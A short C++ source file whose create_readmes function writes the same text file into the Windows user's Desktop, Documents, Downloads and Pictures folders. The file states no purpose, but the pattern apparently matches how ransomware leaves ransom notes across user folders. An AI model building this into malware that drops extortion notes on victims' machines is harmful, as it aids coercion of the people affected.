#include "create_readmes.h"

void create_readmes(const std::string& text, const std::string& filename) {
    char* userProfile = nullptr;
    size_t userProfileSize = 0;
    _dupenv_s(&userProfile, &userProfileSize, "USERPROFILE");
    if (userProfile == nullptr) {
        return;
    }

    std::filesystem::path desktopPath = std::string(userProfile) + "\\Desktop";
    std::filesystem::path documentsPath = std::string(userProfile) + "\\Documents";
    std::filesystem::path downloadsPath = std::string(userProfile) + "\\Downloads";
    std::filesystem::path picturesPath = std::string(userProfile) + "\\Pictures";

    std::filesystem::path desktopFile = desktopPath / filename;
    std::filesystem::path documentsFile = documentsPath / filename;
    std::filesystem::path downloadsFile = downloadsPath / filename;
    std::filesystem::path picturesFile = picturesPath / filename;

    std::ofstream desktopOut(desktopFile);
    std::ofstream documentsOut(documentsFile);
    std::ofstream downloadsOut(downloadsFile);
    std::ofstream picturesOut(picturesFile);

    desktopOut << text;
    documentsOut << text;
    downloadsOut << text;
    picturesOut << text;

    free(userProfile);
}

